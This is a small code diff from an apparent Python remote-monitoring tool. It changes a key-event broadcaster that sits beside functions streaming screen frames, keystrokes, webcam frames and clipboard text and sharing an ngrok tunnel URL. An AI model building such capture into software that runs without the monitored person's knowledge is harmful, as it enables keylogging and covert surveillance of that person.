@@ -39,7 +39,7 @@ def _emit(event, data):
 
 
 def broadcast_frame(b64):      _emit("frame",        {"data": b64})
-def broadcast_key(char):       _emit("key",          {"char": char})
+def broadcast_key(data):       _emit("key",          data if isinstance(data, dict) else {"char": data})
 def broadcast_camera(b64):     _emit("camera_frame", {"data": b64})
 def broadcast_clipboard(text): _emit("clipboard",    {"text": text})
 def broadcast_ngrok_url(url):  _emit("ngrok_url",    {"url": url})
